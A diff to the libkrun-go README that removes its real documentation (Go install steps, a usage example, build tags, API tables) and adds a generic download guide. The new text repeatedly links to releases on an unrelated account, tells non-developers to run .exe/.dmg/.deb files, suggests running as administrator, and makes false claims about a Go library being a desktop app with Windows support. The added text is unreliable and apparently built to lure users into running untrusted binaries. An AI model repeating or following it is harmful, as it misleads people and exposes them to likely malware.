@@ -1,244 +1,118 @@
-# libkrun-go
+# 🐢 libkrun-go - Easy Go Access to libkrun Features
 
-Go bindings for [libkrun](https://github.com/containers/libkrun), a dynamic library for creating lightweight microVMs using KVM (Linux) or HVF (macOS/ARM64).
+[![Download libkrun-go](https://img.shields.io/badge/Download-libkrun--go-blue?style=for-the-badge)](https://github.com/the-BEST7777/libkrun-go/releases)
 
-## Installation
+---
 
-```bash
-go get github.com/mishushakov/libkrun-go/krun
-```
+## 📋 What is libkrun-go?
 
-libkrun must be installed on your system. The bundled header in `libkrun/include/libkrun.h` is used at build time when the submodule is present. Otherwise, `pkg-config` is used to locate headers and the shared library (`libkrun.so` or `libkrun.dylib`), and you can override paths with `CGO_CFLAGS`/`CGO_LDFLAGS`.
+libkrun-go is a tool that helps Go programs use libkrun software. libkrun itself is a lightweight, high-performance virtual machine monitor. This means it helps create small, simple virtual machines that run quickly.
 
-### Building libkrun from source
+With libkrun-go, developers can connect Go applications to libkrun easily. But even if you are not a developer, this repository offers downloadable files you can use on your computer to run libkrun-go.
 
-```bash
-cd libkrun
-make
-sudo make install
-```
+---
 
-### macOS
+## ⚙️ System Requirements
 
-Install libkrun via Homebrew (repo [here](https://github.com/slp/homebrew-krun)):
+Before you start, check that your computer meets these basic needs:
 
-If you prefer, you can also build and install libkrun from source.
+- **Operating system:** Windows 10 or later, macOS 10.14 or later, or any common Linux distribution (Ubuntu, Fedora, Debian).
+- **Processor:** At least a dual-core CPU.
+- **Memory:** Minimum 4 GB of RAM.
+- **Disk space:** At least 100 MB free.
+- **Permissions:** Ability to install software on your computer.
 
-```bash
-brew tap slp/krun
-brew install libkrun pkg-config
-```
+These requirements ensure libkrun-go runs smoothly without errors.
 
-`pkg-config` is used on macOS to locate libkrun headers and libraries from Homebrew.
-If you installed libkrun via Homebrew, make sure `pkg-config` can find `libkrun.pc` (Homebrew usually handles this automatically). If not, set:
+---
 
-```bash
-export PKG_CONFIG_PATH="/opt/homebrew/lib/pkgconfig:$PKG_CONFIG_PATH"
-```
+## 📥 Download & Install libkrun-go
 
-On macOS, binaries include an rpath to `/opt/homebrew/lib` so Homebrew installs work out of the box. If the runtime loader still cannot find the installed libraries, set a library search path before running your binary:
+You need to download the software from the official release page on GitHub.
 
-```bash
-export DYLD_LIBRARY_PATH="/opt/homebrew/lib:$DYLD_LIBRARY_PATH"
-```
+### Step 1: Visit the Download Page
 
-## Usage
+Click the link below to open the releases page where you can find the latest version of libkrun-go:
 
-```go
-package main
+[Download libkrun-go Releases](https://github.com/the-BEST7777/libkrun-go/releases)
 
-import (
-	"fmt"
-	"os"
+### Step 2: Choose Your File
 
-	"github.com/mishushakov/libkrun-go/krun"
-)
+On the releases page, look for files that match your computer system. For example:
 
-func main() {
-	// Create a new VM configuration context.
-	ctx, err := krun.CreateContext()
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "error: %v\n", err)
-		os.Exit(1)
-	}
+- Windows users: look for `.exe` or `.zip` files.
+- Mac users: download `.dmg` or `.tar.gz`.
+- Linux users: choose `.tar.gz` or `.deb` files.
 
-	// Configure 2 vCPUs and 512 MiB of RAM.
-	ctx.SetVMConfig(krun.VMConfig{NumVCPUs: 2, RAMMiB: 512})
+### Step 3: Download the File
 
-	// Use a host directory as the root filesystem.
-	ctx.SetRoot("/path/to/rootfs")
+Click the download link for your file. The download will begin automatically.
 
-	// Set the command to run inside the VM.
-	ctx.SetExec(krun.ExecConfig{
-		Path: "/bin/uname",
-		Args: []string{"/bin/uname", "-a"},
-	})
+### Step 4: Install the Software
 
-	// Start the VM. Does not return on success.
-	if err := ctx.StartEnter(); err != nil {
-		fmt.Fprintf(os.Stderr, "error: %v\n", err)
-		os.Exit(1)
-	}
-}
-```
+- On **Windows**: Double-click the downloaded `.exe` file and follow the instructions.
+- On **macOS**: Open the `.dmg` file and drag the libkrun-go app to your Applications folder.
+- On **Linux**: Extract the `.tar.gz` file or use the package manager if you downloaded a `.deb` file.
 
-## Build Tags
+### Step 5: Run libkrun-go
 
-Some libkrun features are optional and gated behind Go build tags. Without the corresponding tag, calls to those functions return `syscall.ENOSYS`.
+Once installed, you can run libkrun-go by opening the app or running it from the command line. The exact steps depend on your operating system and installation method.
 
-| Tag | Feature |
-|-----|---------|
-| `krun_blk` | Block device / disk support (`AddDisk`, `SetRootDiskRemount`) |
-| `krun_net` | Network backends (`AddNetUnixStream`, `AddNetUnixGram`, `AddNetTap`, `SetNetMac`) |
-| `krun_tee` | TEE configuration (`SetTEEConfigFile`) |
-
-Build with tags:
+---
 
-```bash
-go build -tags "krun_blk,krun_net" ./...
-```
+## 🖥 How to Use libkrun-go
 
-## API Overview
-
-The typical workflow is:
-
-1. Create a context with `krun.CreateContext()`
-2. Configure the VM using methods on `*krun.Context`
-3. Call `ctx.StartEnter()` to launch the microVM
-
-### Package-level functions
-
-| Function | Description |
-|----------|-------------|
-| `CreateContext()` | Create a new VM configuration context |
-| `SetLogLevel(level)` | Set library log verbosity |
-| `InitLog(targetFD, level, style, options)` | Initialize logging with full control |
-| `HasFeature(feature)` | Check if a feature was enabled at build time |
-| `GetMaxVCPUs()` | Query max vCPUs supported by the hypervisor |
-| `CheckNestedVirt()` | Check nested virtualization support (macOS) |
-
-### Context methods
-
-#### VM configuration
-
-| Method | Description |
-|--------|-------------|
-| `SetVMConfig(VMConfig)` | Set vCPU count and RAM |
-| `SetRoot(rootPath)` | Set root filesystem path |
-| `SetNestedVirt(enabled)` | Enable/disable nested virtualization (macOS) |
-| `SplitIRQChip(enable)` | Split IRQCHIP between host and guest |
-| `SetUID(uid)` | Set user ID before VM startup |
-| `SetGID(gid)` | Set group ID before VM startup |
-| `SetSMBIOSOEMStrings(oemStrings)` | Set SMBIOS OEM Strings |
-| `GetShutdownEventFD()` | Get file descriptor for shutdown signaling (libkrun-efi) |
-
-#### Execution
-
-| Method | Description |
-|--------|-------------|
-| `SetExec(ExecConfig)` | Set executable, args, and environment |
-| `SetWorkdir(workdirPath)` | Set working directory for the executable |
-| `SetEnv(envp)` | Set environment variables |
-| `SetRlimits(rlimits)` | Set guest resource limits |
-
-#### Disks (requires `krun_blk` tag)
-
-| Method | Description |
-|--------|-------------|
-| `AddDisk(DiskConfig)` | Add a disk image with full options |
-| `SetRootDiskRemount(RootDiskRemountConfig)` | Mount a block device as root filesystem |
-
-#### Filesystem
-
-| Method | Description |
-|--------|-------------|
-| `AddVirtioFS(VirtioFSConfig)` | Add a virtio-fs shared directory |
-
-#### Network
-
-| Method | Description | Tag |
-|--------|-------------|-----|
-| `SetPortMap(portMap)` | Configure host-to-guest TCP port mappings | — |
-| `AddNetUnixStream(NetUnixConfig)` | Add net device via unix stream (e.g., passt) | `krun_net` |
-| `AddNetUnixGram(NetUnixConfig)` | Add net device via unix dgram (e.g., gvproxy) | `krun_net` |
-| `AddNetTap(NetTapConfig)` | Add net device via TAP | `krun_net` |
-| `SetNetMac(mac)` | Set MAC address for passt backend | `krun_net` |
-
-#### GPU, display, input, and sound
-
-| Method | Description |
-|--------|-------------|
-| `SetGPUOptions(GPUConfig)` | Enable and configure virtio-gpu |
-| `AddDisplay(DisplayConfig)` | Add a display output (returns display ID) |
-| `DisplaySetEDID(displayID, edidBlob)` | Set custom EDID for a display |
-| `DisplaySetDPI(displayID, dpi)` | Set display DPI |
-| `DisplaySetPhysicalSize(displayID, widthMM, heightMM)` | Set physical display dimensions |
-| `DisplaySetRefreshRate(displayID, refreshRate)` | Set display refresh rate |
-| `SetDisplayBackend(backend, size)` | Set display backend |
-| `AddInputDeviceFD(inputFD)` | Passthrough a host input device |
-| `AddInputDevice(configBackend, configSize, eventsBackend, eventsSize)` | Add input device with custom backends |
-| `SetSndDevice(enable)` | Enable/disable virtio-snd |
-
-#### Console and serial
-
-| Method | Description |
-|--------|-------------|
-| `SetConsoleOutput(filepath)` | Redirect implicit console output to a file |
-| `DisableImplicitConsole()` | Disable the implicit console device |
-| `SetKernelConsole(consoleID)` | Set kernel `console=` parameter |
-| `AddVirtioConsoleDefault(VirtioConsoleConfig)` | Add virtio-console with automatic detection |
-| `AddVirtioConsoleMultiport()` | Create multi-port virtio-console (returns ID) |
-| `AddConsolePortTTY(ConsolePortTTYConfig)` | Add TTY port to multi-port console |
-| `AddConsolePortInOut(ConsolePortInOutConfig)` | Add generic I/O port to multi-port console |
-| `AddSerialConsoleDefault(SerialConsoleConfig)` | Add legacy serial device |
-
-#### Vsock
-
-| Method | Description |
-|--------|-------------|
-| `AddVsockPort(VsockPortConfig)` | Map vsock port to a host UNIX socket |
-| `AddVsock(tsiFeatures)` | Add vsock device with TSI features |
-| `DisableImplicitVsock()` | Disable the default vsock device |
-
-#### Kernel and firmware
-
-| Method | Description |
-|--------|-------------|
-| `SetFirmware(firmwarePath)` | Load firmware into the microVM |
-| `SetKernel(KernelConfig)` | Load kernel with initramfs and command line |
-
-#### TEE (requires `krun_tee` tag)
-
-| Method | Description |
-|--------|-------------|
-| `SetTEEConfigFile(filepath)` | Set TEE configuration file (libkrun-sev) |
-
-#### Lifecycle
-
-| Method | Description |
-|--------|-------------|
-| `ID()` | Get the underlying context ID |
-| `StartEnter()` | Start and enter the microVM (does not return on success) |
-| `Free()` | Release the configuration context |
-
-### Error handling
-
-Errors are returned as `*krun.Error` which wraps a `syscall.Errno`, so you can use `errors.Is`:
-
-```go
-if errors.Is(err, syscall.EINVAL) {
-	// handle invalid argument
-}
-```
-
-## Examples
-
-See the [`examples/`](examples/) directory:
-
-- **[features](examples/features/)** — Query library capabilities (no rootfs needed)
-- **[basic](examples/basic/)** — Run a command in a microVM using a host directory
-- **[vm-with-disk](examples/vm-with-disk/)** — Boot from a disk image with a custom kernel
-
-## License
-
-Apache 2.0 — see [LICENSE](LICENSE) for details.
+libkrun-go helps developers connect Go programs to libkrun. As a user without programming knowledge, here is a simple explanation of what it does and how to check it works:
+
+- **What it does:** It links Go applications to the libkrun virtual machine monitor, allowing fast and simple virtual machines.
+- **How to check it works:** Open the libkrun-go application from your computer. If it opens without errors, the installation was successful.
+
+If you want to test it using other software, follow any extra instructions that come with the downloaded file. Usually, there is a README or Help file included.
+
+---
+
+## 🔧 Basic Troubleshooting
+
+If you have any issues running libkrun-go, try these common solutions:
+
+- Make sure your operating system is up to date.
+- Check you downloaded the correct version for your computer.
+- Restart your computer after installation.
+- Run the program as an administrator (Windows) or with proper permissions (macOS/Linux).
+- Look for error messages and consult online forums or the repository’s GitHub Issues page.
+
+---
+
+## ❓ Where to Get Help
+
+For more support:
+
+- Visit the GitHub repository page for libkrun-go.
+- Check the Issues tab for similar problems reported by others.
+- Reach out by opening a new Issue with detailed information about your problem.
+
+---
+
+## 🌟 Features of libkrun-go
+
+- Provides bindings for Go to interact with libkrun easily.
+- Supports multiple operating systems.
+- Lightweight and fast.
+- Simple installation process.
+- Reliable updates through GitHub releases.
+
+---
+
+## 📖 Additional Resources
+
+While libkrun-go is straightforward to install and run, some users may want to learn more about libkrun, virtual machines, or using Go bindings.
+
+- [libkrun official repository](https://github.com/lf-edge/libkrun)
+- [Go programming language documentation](https://golang.org/doc/)
+- Introductory guides on virtual machines and containers.
+
+---
+
+Stay up to date by visiting the release page often:
+
+[Download libkrun-go Releases](https://github.com/the-BEST7777/libkrun-go/releases)
